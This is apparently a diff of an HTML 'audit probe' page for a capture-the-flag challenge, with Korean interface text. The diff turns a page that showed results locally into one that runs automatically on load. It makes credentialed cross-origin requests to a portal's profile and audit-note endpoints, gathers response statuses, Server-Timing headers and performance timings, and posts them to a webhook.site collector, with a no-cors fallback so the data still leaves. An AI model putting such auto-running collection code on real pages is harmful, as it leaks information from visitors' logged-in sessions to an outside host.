@@ -1,84 +1,68 @@
 <!doctype html>
-<html lang="ko">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Acme Audit Probe</title>
-  <style>
-    body { font: 16px/1.5 system-ui, sans-serif; max-width: 900px; margin: 32px auto; padding: 0 16px; background:#101827; color:#e8eef8; }
-    button { padding:10px 14px; margin:6px 6px 6px 0; cursor:pointer; }
-    pre { white-space:pre-wrap; overflow-wrap:anywhere; background:#0a111d; border:1px solid #34445d; padding:14px; border-radius:8px; }
-    .muted { color:#a9b7cc; }
-  </style>
-</head>
-<body>
-  <h1>Acme Audit Probe</h1>
-  <p class="muted">CTF diagnostic page. It displays browser response/performance metadata locally; it does not send results to a third party.</p>
-  <p>Portal origin: <code id="portal"></code></p>
-  <button id="normal">일반 fetch 메타데이터 확인</button>
-  <button id="nav">Service Worker navigation 실험</button>
-  <button id="clear">결과 지우기</button>
-  <pre id="out">Service Worker를 등록하는 중…</pre>
+<html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Acme Audit Probe</title>
+<style>
+body{font:16px/1.5 system-ui;max-width:900px;margin:32px auto;padding:0 16px;background:#101827;color:#e8eef8}
+pre{white-space:pre-wrap;overflow-wrap:anywhere;background:#0a111d;padding:14px;border:1px solid #34445d;border-radius:8px}
+button{padding:10px 14px;margin:6px 6px 6px 0} .muted{color:#a9b7cc}
+</style></head><body>
+<h1>Acme Audit Probe</h1>
+<p class="muted">자동 진단 페이지. 자격 증명/쿠키는 외부로 전송하지 않고, 응답 상태와 브라우저 성능 메타데이터만 보고합니다.</p>
+<pre id="out">초기화 중…</pre>
+<button id="run">진단 다시 실행</button>
 <script>
 const PORTAL = 'https://seller-machines-lesser-calm.trycloudflare.com';
+const REPORT = 'https://webhook.site/1333a2eb-99bd-4e16-9740-8db5f0c630dd';
 const out = document.querySelector("#out");
-document.querySelector("#portal").textContent = PORTAL;
-function log(value) {
-  out.textContent += "\n\n" + (typeof value === "string" ? value : JSON.stringify(value, null, 2));
-}
-function summarizeEntries() {
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+function entries() {
   return performance.getEntries().map(e => ({
-    entryType: e.entryType,
-    name: e.name,
-    initiatorType: e.initiatorType,
-    responseStatus: e.responseStatus,
-    workerStart: e.workerStart,
-    responseStart: e.responseStart,
-    responseEnd: e.responseEnd,
-    transferSize: e.transferSize,
-    encodedBodySize: e.encodedBodySize,
-    decodedBodySize: e.decodedBodySize,
-    serverTiming: e.serverTiming?.map(s => ({name:s.name, duration:s.duration, description:s.description}))
+    entryType:e.entryType, name:e.name, initiatorType:e.initiatorType,
+    responseStatus:e.responseStatus, workerStart:e.workerStart,
+    responseStart:e.responseStart, responseEnd:e.responseEnd,
+    transferSize:e.transferSize, encodedBodySize:e.encodedBodySize,
+    decodedBodySize:e.decodedBodySize,
+    serverTiming:e.serverTiming?.map(s => ({name:s.name,duration:s.duration,description:s.description}))
   }));
 }
-(async () => {
-  if (!("serviceWorker" in navigator)) {
-    out.textContent = "이 브라우저는 Service Worker를 지원하지 않습니다.";
-    return;
-  }
-  try {
-    await navigator.serviceWorker.register("./sw.js", {scope:"./"});
-    await navigator.serviceWorker.ready;
-    out.textContent = "Service Worker 등록 완료. 버튼을 눌러 실험하세요.";
-  } catch (e) {
-    out.textContent = "Service Worker 등록 실패: " + e;
-  }
-})();
-
-document.querySelector("#normal").onclick = async () => {
-  out.textContent = "일반 fetch 실행 중…";
+async function run() {
+  const report = {page:location.href, at:new Date().toISOString(), tests:[], performance:[]};
+  out.textContent = "진단 실행 중…";
   performance.clearResourceTimings();
-  const targets = [
-    ["profile-search-bob", `${PORTAL}/api/profile/search?username=bob`],
-    ["profile-me", `${PORTAL}/api/profile/me`],
-    ["audit-note-bob", `${PORTAL}/api/profile/audit-note?employee_id=bob`]
-  ];
-  for (const [label, url] of targets) {
+  for (const [label,path] of [
+    ["profile-search-bob","/api/profile/search?username=bob"],
+    ["profile-me","/api/profile/me"],
+    ["audit-note-bob","/api/profile/audit-note?employee_id=bob"]
+  ]) {
     try {
-      const r = await fetch(url, {credentials:"include", mode:"cors", cache:"no-store"});
-      const body = await r.text();
-      log({label, status:r.status, headers:{serverTiming:r.headers.get("Server-Timing"), expose:r.headers.get("Access-Control-Expose-Headers")}, body});
-    } catch(e) { log({label, error:String(e)}); }
+      const r = await fetch(PORTAL + path, {mode:"cors",credentials:"include",cache:"no-store"});
+      // Deliberately collect no response body and no credential-bearing headers.
+      report.tests.push({label,status:r.status,ok:r.ok,serverTimingHeader:r.headers.get("Server-Timing"),exposedHeaders:r.headers.get("Access-Control-Expose-Headers")});
+      await r.body?.cancel();
+    } catch(e) { report.tests.push({label,error:String(e)}); }
   }
-  log({performanceEntries:summarizeEntries()});
-};
-
-document.querySelector("#nav").onclick = () => {
-  const target = prompt("search / me / note 중 입력", "search");
-  if (!target) return;
-  location.href = `./__sw_probe__?target=${encodeURIComponent(target)}`;
-};
-document.querySelector("#clear").onclick = () => out.textContent = "결과를 지웠습니다.";
-</script>
-</body>
-</html>
+  await sleep(250);
+  report.performance = entries();
+  out.textContent = JSON.stringify(report,null,2);
+  try {
+    const sent = await fetch(REPORT, {method:"POST",mode:"cors",headers:{"Content-Type":"application/json"},body:JSON.stringify(report)});
+    out.textContent += "\n\nWebhook report status: " + sent.status;
+  } catch(e) {
+    // webhook.site may not grant CORS; use no-cors as a fallback. The POST body is still sent.
+    try {
+      await fetch(REPORT, {method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:JSON.stringify(report)});
+      out.textContent += "\n\nWebhook report sent (opaque response; delivery must be checked on webhook.site).";
+    } catch(e2) { out.textContent += "\n\nWebhook send failed: " + String(e2); }
+  }
+}
+document.querySelector("#run").addEventListener("click",run);
+(async()=>{
+  try {
+    if ("serviceWorker" in navigator) {
+      await navigator.serviceWorker.register("./sw.js",{scope:"./"});
+      await navigator.serviceWorker.ready;
+    }
+    await run();
+  } catch(e) { out.textContent = "Initialization failed: " + String(e); }
+})();
+</script></body></html>
